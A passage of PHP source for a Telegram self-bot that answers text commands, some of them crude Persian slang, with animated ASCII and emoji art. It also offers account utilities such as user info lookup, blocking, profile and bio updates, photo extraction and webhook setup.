█████▓▓▓▓▓▓▓▓█▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█ ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '
█████▓▓▓▓▓▓▓██▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬██ 
█████▓▓▓▓▓████▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬██
████▓█▓▓▓▓██▓▓▓▓██╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬██ 
█████▓███▓▓▓▓▓▓▓▓████▓▓╬╬╬╬╬╬╬█▓╬╬╬╬╬▓██ 
█████▓▓█▓███▓▓▓████╬▓█▓▓╬╬╬▓▓█▓╬╬╬╬╬╬███
██████▓██▓███████▓╬╬╬▓▓╬▓▓██▓╬╬╬╬╬╬╬▓███
███████▓██▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓╬╬╬╬╬╬╬╬╬╬╬████
███████▓▓██▓▓▓▓▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓████ 
████████▓▓▓█████▓▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█████
█████████▓▓▓█▓▓▓▓▓███▓╬╬╬╬╬╬╬╬╬╬╬▓██████ 
██████████▓▓▓█▓▓▓╬▓██╬╬╬╬╬╬╬╬╬╬╬▓███████
███████████▓▓█▓▓▓▓███▓╬╬╬╬╬╬╬╬╬▓████████ 
██████████████▓▓▓███▓▓╬╬╬╬╬╬╬╬██████████ 
███████████████▓▓▓██▓▓╬╬╬╬╬╬▓███████████']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '
███████▓█████▓▓╬╬╬╬╬╬╬╬▓███▓╬╬╬╬╬╬╬▓╬╬▓█ 
████▓▓▓▓╬╬▓█████╬╬╬╬╬╬███▓╬╬╬╬╬╬╬╬╬╬╬╬╬█ 
███▓▓▓▓╬╬╬╬╬╬▓██╬╬╬╬╬╬▓▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█ 
████▓▓▓╬╬╬╬╬╬╬▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█ 
███▓█▓███████▓▓███▓╬╬╬╬╬╬▓███████▓╬╬╬╬▓█ 
████████████████▓█▓╬╬╬╬╬▓▓▓▓▓▓▓▓╬╬╬╬╬╬╬█ 
███▓▓▓▓▓▓▓╬╬▓▓▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█ 
████▓▓▓╬╬╬╬▓▓▓▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█ 
███▓█▓▓▓▓▓▓▓▓▓▓▓▓▓▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█ 
█████▓▓▓▓▓▓▓▓█▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█ 
█████▓▓▓▓▓▓▓██▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬██ 
█████▓▓▓▓▓████▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬██ 
████▓█▓▓▓▓██▓▓▓▓██╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬██ 
████▓▓███▓▓▓▓▓▓▓██▓╬╬╬╬╬╬╬╬╬╬╬╬█▓╬▓╬╬▓██ 
█████▓███▓▓▓▓▓▓▓▓████▓▓╬╬╬╬╬╬╬█▓╬╬╬╬╬▓██ 
█████▓▓█▓███▓▓▓████╬▓█▓▓╬╬╬▓▓█▓╬╬╬╬╬╬███ 
██████▓██▓███████▓╬╬╬▓▓╬▓▓██▓╬╬╬╬╬╬╬▓███ 
███████▓██▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓╬╬╬╬╬╬╬╬╬╬╬████ 
███████▓▓██▓▓▓▓▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓████ 
████████▓▓▓█████▓▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█████ 
█████████▓▓▓█▓▓▓▓▓███▓╬╬╬╬╬╬╬╬╬╬╬▓██████ 
██████████▓▓▓█▓▓▓╬▓██╬╬╬╬╬╬╬╬╬╬╬▓███████ 
███████████▓▓█▓▓▓▓███▓╬╬╬╬╬╬╬╬╬▓████████ 
██████████████▓▓▓███▓▓╬╬╬╬╬╬╬╬██████████ 
███████████████▓▓▓██▓▓╬╬╬╬╬╬▓███████████']);

                    }
                    if ($text == 'love3' or $text == 'Love3' or $text == 'دوست') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '
▀██▀─▄███▄─▀██─██▀██▀▀█
─██─███─███─██─██─██▄█']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '
─██─▀██▄██▀─▀█▄█▀─██▀█
▄██▄▄█▀▀▀─────▀──▄██▄▄█']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '
▀██▀─▄███▄─▀██─██▀██▀▀█
─██─███─███─██─██─██▄█
─██─▀██▄██▀─▀█▄█▀─██▀█
▄██▄▄█▀▀▀─────▀──▄██▄▄█']);

                    }
                    if ($text == 'دهنت سرویس' or $text == 'koni' or $text == 'کونی' or $text == 'خخخ') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '
░░░░░░░░███████████████░░░░░░░░
░░░░░█████████████████████░░░░░
░░░░████████████████████████░░░
░░░██████████████████████████░░
░░█████████████████████████████
░░███████████▀░░░░░░░░░████████
░░███████████░░░░░░░░░░░░░░░███
░████████████░░░░░░░░░░░░░░░░██
░█░░███████░░░░░░░░░░░▄▄░░░░░██
█░░░░█████░░░░░░▄███████░░██░░█
█░░█░░░███░░░░░██▀▀░░░░░░░░██░█
█░░░█░░░░░░░░░░░░▄██▄░░░░░░░███
█░░▄█░░░░░░░░░░░░░░░░░░█▀▀█▄░██
█░░░░░░░░░░░░░░░░░░░░░░█░░░░██░']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '
░███░░░░░░░░░░░░░░░░░░░█░░░░█░░
░░█░█░░░░░░░█░░░░░██▀▄░▄██░░░█░
░░█░█░░░░░░█░░░░░░░░░░░░░░░░░█░
░░░██░░░░░░█░░░░▄▄▄▄▄▄░░░░░░█░░
░░░██░░░░░░░█░░█▄▄▄▄░▀▀██░░█░░░
░░░██░░░░░░░█░░▀████████░░█░░░░
░░█░░█░░░░░░░█░░▀▄▄▄▄██░░█░░░░░
░░█░░░█░░░░░░░█░░░░░░░░░█░░░░░░
░█░░░░░█░░░░░░░░░░░░░░░░█░░░░░░
░░░░░░░░█░░░░░░█░░░░░░░░█░░░░░░
░░░░░░░░░░░░░░░░████████░░░░░░░']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '
░░░░░░░░███████████████░░░░░░░░
░░░░░█████████████████████░░░░░
░░░░████████████████████████░░░
░░░██████████████████████████░░
░░█████████████████████████████
░░███████████▀░░░░░░░░░████████
░░███████████░░░░░░░░░░░░░░░███
░████████████░░░░░░░░░░░░░░░░██
░█░░███████░░░░░░░░░░░▄▄░░░░░██
█░░░░█████░░░░░░▄███████░░██░░█
█░░█░░░███░░░░░██▀▀░░░░░░░░██░█
█░░░█░░░░░░░░░░░░▄██▄░░░░░░░███
█░░▄█░░░░░░░░░░░░░░░░░░█▀▀█▄░██
█░░░░░░░░░░░░░░░░░░░░░░█░░░░██░
░███░░░░░░░░░░░░░░░░░░░█░░░░█░░
░░█░█░░░░░░░█░░░░░██▀▄░▄██░░░█░
░░█░█░░░░░░█░░░░░░░░░░░░░░░░░█░
░░░██░░░░░░█░░░░▄▄▄▄▄▄░░░░░░█░░
░░░██░░░░░░░█░░█▄▄▄▄░▀▀██░░█░░░
░░░██░░░░░░░█░░▀████████░░█░░░░
░░█░░█░░░░░░░█░░▀▄▄▄▄██░░█░░░░░
░░█░░░█░░░░░░░█░░░░░░░░░█░░░░░░
░█░░░░░█░░░░░░░░░░░░░░░░█░░░░░░
░░░░░░░░█░░░░░░█░░░░░░░░█░░░░░░
░░░░░░░░░░░░░░░░████████░░░░░░░']);

                    }


                    if ($text == 'bk2' or $text == 'بکیرم2') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
🤤🤤🤤
🤤         🤤
🤤           🤤
🤤        🤤
🤤🤤🤤
🤤         🤤
🤤           🤤
🤤           🤤
🤤        🤤
🤤🤤🤤
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
😂         😂
😂       😂
😂     😂
😂   😂
😂😂
😂   😂
😂      😂
😂        😂
😂          😂
😂            😂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
👽👽👽          👽         👽
😍         😍      😍       😍
😎           😎    😎     😎
🤬        🤬       🤬   🤬
😄😄😄          🤓 🤓
🤨         😊      😋   😋
🤯           🤯    🤯     🤯
🤘           🤘    😘        😘
🤫       🤫        🙊          🙊
🤡🤡🤡          😗             🙊"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
💋💋💋          💋         💋
😏         😏      😏       😏
😏           😏    😏     😏
😄        😄       😄   😄
😄😄😄          😄😄
🤘         🤘      🤘   🤘
🤘           🤘    🤘      🤘
🙊           🙊    🙊        🙊
🙊       🙊        🙊          🙊
💋💋💋          💋            💋"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
😏😏😏          😏         😏
😏         😏      😏       😏
😄           😄    😄     😄
😄        😄       😄   😄
🤘🤘🤘          🤘🤘
🤘         🤘      🤘   🤘
🙊           🙊    🙊      🙊
🙊           🙊    🙊        🙊
💋       💋        💋          💋
💋💋💋          💋            💋"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
😏😏😏          😏         😏
😄         😄      😄       😄
😄           😄    😄     😄
🤘        🤘       🤘   🤘
🤘🤘🤘          🤘🤘
🙊         🙊      🙊   🙊
🙊           🙊    🙊      🙊
💋           💋    💋        💋
💋       💋        💋          💋
😏😏😏          😏            😏"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
😄😄😄          😄         😄
😄         😄      😄       😄
🤘           🤘    🤘     🤘
🤘        🤘       🤘   🤘
🙊🙊🙊          🙊🙊
🙊         🙊      🙊   🙊
💋           💋    💋      💋
💋           💋    💋        💋
😏       😏        😏          😏
😏😏😏          😏            😏
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
😄😄😄          😄         😄
🤘         🤘      🤘       🤘
🤘           🤘    🤘     🤘
🙊        🙊       🙊   🙊
🙊🙊🙊          🙊🙊
💋         💋      💋   💋
💋           💋    💋      💋
😏           😏    😏        😏
😏       😏        😏          😏
😄😄😄          😄            😄
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
🤘🤘🤘          🤘         🤘
🤘         🤘      🤘       🤘
🙊           🙊    🙊     🙊
🙊        🙊       🙊   🙊
💋💋💋          💋💋
💋         💋      💋   💋
😏           😏    😏      😏
😏           😏    😏        😏
😄       😄        😄          😄
😄😄😄          😄            😄
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
🤘🤘🤘          🤘         🤘
🙊         🙊      🙊       🙊
🙊           🙊    🙊     🙊
💋        💋       💋   💋
💋💋💋          💋💋
😏         😏      😏   😏
😏           😏    😏      😏
😄           😄    😄        😄
😄       😄        😄          😄
🤘🤘🤘          🤘            🤘
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
🙊🙊🙊          🙊         🙊
🙊         🙊      🙊       🙊
💋           💋    💋     💋
💋        💋       💋   💋
😏😏😏          😏😏
😏         😏      😏   😏
😄           😄    😄      😄
😄           😄    😄        😄
🤘       🤘        🤘          🤘
🤘🤘🤘          🤘            🤘
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
🙊🙊🙊          🙊         🙊
💋         💋      💋       💋
💋           💋    💋     💋
😏        😏       😏   😏
😏😏😏          😏😏
😄         😄      😄   😄
😄           😄    😄      😄
🤘           🤘    🤘        🤘
🤘       🤘        🤘          🤘
🙊🙊🙊          🙊            🙊
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
💋💋💋          💋         💋
💋         💋      💋       💋
😏           😏    😏     😏
😏        😏       😏   😏
😄😄😄          😄😄
😄         😄      😄   😄
🤘           🤘    🤘      🤘
🤘           🤘    🤘        🤘
🙊       🙊        🙊          🙊
🙊🙊🙊          🙊            🙊
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
💋💋💋          💋         💋
😏         😏      😏       😏
😏           😏    😏     😏
😄        😄       😄   😄
😄😄😄          😄😄
🤘         🤘      🤘   🤘
🤘           🤘    🤘      🤘
🙊           🙊    🙊        🙊
🙊       🙊        🙊          🙊
💋💋💋          💋            💋
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
😏😏😏          😏         😏
😏         😏      😏       😏
😄           😄    😄     😄
😄        😄       😄   😄
🤘🤘🤘          🤘🤘
🤘         🤘      🤘   🤘
🙊           🙊    🙊      🙊
🙊           🙊    🙊        🙊
💋       💋        💋          💋
💋💋💋          💋            💋
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
😏😏😏          😏         😏
😄         😄      😄       😄
😄           😄    😄     😄
🤘        🤘       🤘   🤘
🤘🤘🤘          🤘🤘
🙊         🙊      🙊   🙊
🙊           🙊    🙊      🙊
💋           💋    💋        💋
💋       💋        💋          💋
😏😏😏          😏            😏
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
😄😄😄          😄         😄
😄         😄      😄       😄
🤘           🤘    🤘     🤘
🤘        🤘       🤘   🤘
🙊🙊🙊          🙊🙊
🙊         🙊      🙊   🙊
💋           💋    💋      💋
💋           💋    💋        💋
😏       😏        😏          😏
😏😏😏          😏            😏
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
😄😄😄          😄         😄
🤘         🤘      🤘       🤘
🤘           🤘    🤘     🤘
🙊        🙊       🙊   🙊
🙊🙊🙊          🙊🙊
💋         💋      💋   💋
💋           💋    💋      💋
😏           😏    😏        😏
😏       😏        😏          😏
😄😄😄          😄            😄
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
🤘🤘🤘          🤘         🤘
🤘         🤘      🤘       🤘
🙊           🙊    🙊     🙊
🙊        🙊       🙊   🙊
💋💋💋          💋💋
💋         💋      💋   💋
😏           😏    😏      😏
😏           😏    😏        😏
😄       😄        😄          😄
😄😄😄          😄            😄
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
🤘🤘🤘          🤘         🤘
🙊         🙊      🙊       🙊
🙊           🙊    🙊     🙊
💋        💋       💋   💋
💋💋💋          💋💋
😏         😏      😏   😏
😏           😏    😏      😏
😄           😄    😄        😄
😄       😄        😄          😄
🤘🤘🤘          🤘            🤘
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
🙊🙊🙊          🙊         🙊
🙊         🙊      🙊       🙊
💋           💋    💋     💋
💋        💋       💋   💋
😏😏😏          😏😏
😏         😏      😏   😏
😄           😄    😄      😄
😄           😄    😄        😄
🤘       🤘        🤘          🤘
🤘🤘🤘          🤘            🤘
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
🙊🙊🙊          🙊         🙊
💋         💋      💋       💋
💋           💋    💋     💋
😏        😏       😏   😏
😏😏😏          😏😏
😄         😄      😄   😄
😄           😄    😄      😄
🤘           🤘    🤘        🤘
🤘       🤘        🤘          🤘
🙊🙊🙊          🙊            🙊
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
💋💋💋          💋         💋
💋         💋      💋       💋
😏           😏    😏     😏
😏        😏       😏   😏
😄😄😄          😄😄
😄         😄      😄   😄
🤘           🤘    🤘      🤘
🤘           🤘    🤘        🤘
🙊       🙊        🙊          🙊
🙊🙊🙊          🙊            🙊
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
💋💋💋          💋         💋
😏         😏      😏       😏
😏           😏    😏     😏
😄        😄       😄   😄
😄😄😄          😄😄
🤘         🤘      🤘   🤘
🤘           🤘    🤘      🤘
🙊           🙊    🙊        🙊
🙊       🙊        🙊          🙊
💋💋💋          💋            💋
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
😏😏😏          😏         😏
😏         😏      😏       😏
😄           😄    😄     😄
😄        😄       😄   😄
🤘🤘🤘          🤘🤘
🤘         🤘      🤘   🤘
🙊           🙊    🙊      🙊
🙊           🙊    🙊        🙊
💋       💋        💋          💋
💋💋💋          💋            💋
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
😏😏😏          😏         😏
😄         😄      😄       😄
😄           😄    😄     😄
🤘        🤘       🤘   🤘
🤘🤘🤘          🤘🤘
🙊         🙊      🙊   🙊
🙊           🙊    🙊      🙊
💋           💋    💋        💋
💋       💋        💋          💋
😏😏😏          😏            😏
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
😄😄😄          😄         😄
😄         😄      😄       😄
🤘           🤘    🤘     🤘
🤘        🤘       🤘   🤘
🙊🙊🙊          🙊🙊
🙊         🙊      🙊   🙊
💋           💋    💋      💋
💋           💋    💋        💋
😏       😏        😏          😏
😏😏😏          😏            😏
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
😄😄😄          😄         😄
🤘         🤘      🤘       🤘
🤘           🤘    🤘     🤘
🙊        🙊       🙊   🙊
🙊🙊🙊          🙊🙊
💋         💋      💋   💋
💋           💋    💋      💋
😏           😏    😏        😏
😏       😏        😏          😏
😄😄😄          😄            😄
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
🤘🤘🤘          🤘         🤘
🤘         🤘      🤘       🤘
🙊           🙊    🙊     🙊
🙊        🙊       🙊   🙊
💋💋💋          💋💋
💋         💋      💋   💋
😏           😏    😏      😏
😏           😏    😏        😏
😄       😄        😄          😄
😄😄😄          😄            😄
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
🤘🤘🤘          🤘         🤘
🙊         🙊      🙊       🙊
🙊           🙊    🙊     🙊
💋        💋       💋   💋
💋💋💋          💋💋
😏         😏      😏   😏
😏           😏    😏      😏
😄           😄    😄        😄
😄       😄        😄          😄
🤘🤘🤘          🤘            🤘
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
🙊🙊🙊          🙊         🙊
🙊         🙊      🙊       🙊
💋           💋    💋     💋
💋        💋       💋   💋
😏😏😏          😏😏
😏         😏      😏   😏
😄           😄    😄      😄
😄           😄    😄        😄
🤘       🤘        🤘          🤘
🤘🤘🤘          🤘            🤘
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
🤬🤬🤬          🤬         🤬
😡         😡      😡       😡
🤬           🤬    🤬     🤬
😡        😡       😡   😡
🤬🤬🤬          🤬🤬
😡         😡      😡   😡
🤬           🤬    🤬      🤬
😡           😡    😡        😡
🤬       🤬        🤬          🤬
😡😡😡          😡            😡
"]);
                    }

                    if (preg_match("/^[\/\#\!]?(save)$/si", $text) && isset($update['message']['reply_to']['reply_to_msg_id'])) {
                        $me = yield $this->getSelf();
                        $me_id = $me['id'];
                        yield $this->messages->forwardMessages(['from_peer' => $peer, 'to_peer' => $me_id, 'id' => [$update['message']['reply_to']['reply_to_msg_id']]]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔱♨️> ꜱᴀᴠᴇᴅ🔱♨️"]);
                    }


                    if (preg_match("/^[\/\#\!]?(echo) (on|off)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(echo) (on|off)$/si", $text, $m);
                        $data['echo'] = $m[2];
                        yield $this->filePutContents("data.json", json_encode($data));
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "ᴇᴄʜᴏ ɴᴏᴡ ɪꜱ $m[2]"]);
                    }

                    if (preg_match("/^[\/\#\!]?(info) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(info) (.*)$/si", $text, $m);
                        $mee = yield $this->getFullInfo($m[2]);
                        $me = $mee['User'];
                        $me_id = $me['id'];
                        $me_status = $me['status']['_'];
                        $me_bio = $mee['full']['about'];
                        $me_common = $mee['full']['common_chats_count'];
                        $me_name = $me['first_name'];
                        $me_uname = $me['username'];
                        $mes = "ɪᴅ : $me_id \nɴᴀᴍᴇ: $me_name \nᴜꜱᴇʀɴᴀᴍᴇ: @$me_uname \nꜱᴛᴀᴛᴜꜱ: $me_status \nʙɪᴏ: $me_bio \nᴄᴏᴍᴍᴏɴ ɢʀᴏᴜᴘꜱ ᴄᴏᴜɴᴛ: $me_common";
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => $mes]);
                    }
                    if (preg_match("/^[\/\#\!]?(block) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(block) (.*)$/si", $text, $m);
                        yield $this->contacts->block(['id' => $m[2]]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "ʙʟᴏᴄᴋᴇᴅ!"]);
                    }
                    if (preg_match("/^[\/\#\!]?(unblock) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(unblock) (.*)$/si", $text, $m);
                        yield $this->contacts->unblock(['id' => $m[2]]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "ᴜɴʙʟᴏᴄᴋᴇᴅ!"]);
                    }
                    if (preg_match("/^[\/\#\!]?(checkusername) (@.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(checkusername) (@.*)$/si", $text, $m);
                        $check = yield $this->account->checkUsername(['username' => str_replace("@", "", $m[2])]);
                        if ($check == false) {
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "ᴇxɪꜱᴛꜱ!"]);
                        } else {
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "ꜰʀᴇᴇ!"]);
                        }
                    }
                    if (preg_match("/^[\/\#\!]?(setfirstname) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(setfirstname) (.*)$/si", $text, $m);
                        yield $this->account->updateProfile(['first_name' => $m[2]]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "ɴᴇᴡ ꜰɪʀꜱᴛ ɴᴀᴍᴇ ꜱᴇᴛ️✅"]);
                    }
                    if (preg_match("/^[\/\#\!]?(setlastname) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(setlastname) (.*)$/si", $text, $m);
                        yield $this->account->updateProfile(['last_name' => $m[2]]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "ɴᴇᴡ ʟᴀꜱᴛ ɴᴀᴍᴇ ꜱᴇᴛ✅"]);
                    }
                    if (preg_match("/^[\/\#\!]?(setphoto) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(setphoto) (.*)$/si", $text, $m);
                        if (strpos($m[2], '.jpg') !== false or strpos($m[2], '.png') !== false) {
                            copy($m[2], 'photo.jpg');
                            $photos_Photo = $this->photos->updateProfilePhoto(['id' => 'photo.jpg']);
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => '🔥↤↤𝑵𝒆𝒘 𝒑𝒓𝒐𝒇𝒊𝒍𝒆 𝒑𝒊𝒄𝒕𝒖𝒓𝒆 𝒔𝒆𝒕 𝒔𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚↦↦🔥', 'reply_to_msg_id' => $msg_id]);
                        } else {
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => '❌𝑻𝒉𝒆 𝒇𝒊𝒍𝒆 𝒊𝒔 𝒏𝒐𝒕 𝒊𝒏 𝒕𝒉𝒆 𝒑𝒉𝒐𝒕𝒐 𝒍𝒊𝒏𝒌.', 'reply_to_msg_id' => $msg_id]);
                        }
                    }
                    if (preg_match("/^[\\/\\#\\!]?(tophoto)\$/i", $text)) {
                        if (isset($update['message']['reply_to']['reply_to_msg_id'])) {
                            $rp = $update['message']['reply_to']['reply_to_msg_id'];
                            $Chat = (yield $this->getPwrChat($peer, false));
                            $type = $Chat['type'];
                            if (in_array($type, ['channel', 'supergroup'])) {
                                $messeg = (yield $this->channels->getMessages(['channel' => $peer, 'id' => [$rp]]));
                            } else {
                                $messeg = (yield $this->messages->getMessages(['id' => [$rp]]));
                            }
                            if (isset($messeg['messages'][0]['media'])) {
                                $media = $messeg['messages'][0]['media'];
                                $output_file_name = yield $this->downloadToFile($media, 'files/amir.jpg');
                                yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔥 عکس شما با موفقیت توسط ربات سلف پاون استخراج شد! 🔥"]);

                                $sentMessage = yield $this->messages->sendMedia([
                                    'peer' => $peer,
                                    'media' => [
                                        '_' => 'inputMediaUploadedPhoto',
                                        'message' => '((((:',
                                        'file' => 'files/amir.jpg',
                                        'parse_mode' => 'Markdown'
                                    ]]);
                                unlink('files/amir.jpg');
                            } else {
                                yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "Error  !"]);
                                unlink('files/amir.jpg');
                            }
                        } else {
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "روی یک پیام ریپلی کنید !"]);
                            unlink('files/amir.jpg');
                        }
                    }

                    if (preg_match("/^[\/\#\!]?(setpiclink) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(setpiclink) (.*)$/si", $text, $m);
                        if (strpos($m[2], '.jpg') !== false) {
                            yield $this->filePutContents('aks.txt', $m[2]);
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => '🔥Link Set Shod🔥', 'reply_to_msg_id' => $msg_id]);
                        } else {
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => '❌𝑻𝒉𝒆 𝒇𝒊𝒍𝒆 𝒊𝒔 𝒏𝒐𝒕 𝒊𝒏 𝒕𝒉𝒆 𝒑𝒉𝒐𝒕𝒐 𝒍𝒊𝒏𝒌.', 'reply_to_msg_id' => $msg_id]);
                        }
                    }
                    if (preg_match("/^[\/\#\!]?(setmentionid) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(setmentionid) (.*)$/si", $text, $m);
                        if (strlen($m[2]) < 20) {
                            yield $this->filePutContents('mentionid.txt', $m[2]);
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => '🔥ID Baray Halat Mention2 Set Shod🔥', 'reply_to_msg_id' => $msg_id]);
                        } else {
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => '❌ID ro Bayad Kamtar Az 20 Character Bezani', 'reply_to_msg_id' => $msg_id]);
                        }
                    }
                    if (preg_match("/^[\/\#\!]?(sethelper) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(sethelper) (.*)$/si", $text, $m);
                        if (strlen($m[2]) < 20) {
                            yield $this->filePutContents('helper.txt', $m[2]);
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => '🔥ID Baray Panel Helper Set Shod🔥', 'reply_to_msg_id' => $msg_id]);
                        } else {
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => '❌ID ro Bayad Kamtar Az 20 Character Bezani', 'reply_to_msg_id' => $msg_id]);
                        }
                    }
                    if ($text == "/cbio") {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "mage ba to shookhi daram? bezan /cbio <custom bio>"]);
                    }
                    if (stripos($text, '/cbio ') === 0) {
                        $param = str_replace('/cbio ', '', $text);
                        if (strlen($param) > 65) {
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "❌Bayad Kamtar Az 65 Character Bezani"]);
                        } else {
                            yield $this->filePutContents('cbio.txt', $param);
                            if ($param == "off") {
                                yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "Custom bio off shod"]);
                                $this->account->updateProfile(['about' => ' ']);
                            } else {
                                $param = bioToCustom($param);
                                $this->account->updateProfile(['about' => $param]);
                                yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "Bio set!\n$param"]);
                            }
                        }
                    }
                    if (preg_match("/^[\/\#\!]?(webhook)  (.*) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(webhook)  (.*) (.*)$/si", $text, $m);
                        $token = $m[2];
                        $adress = $m[3];
                        yield $this->fileGetContents('https://api.telegram.org/bot' . $token . '/setWebhook?url=' . $adress);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "$adress-$token webhooked✅."]);
                    }
                    if (preg_match("/^[\/\#\!]?(setbio) (.*)$/si", $text)) {
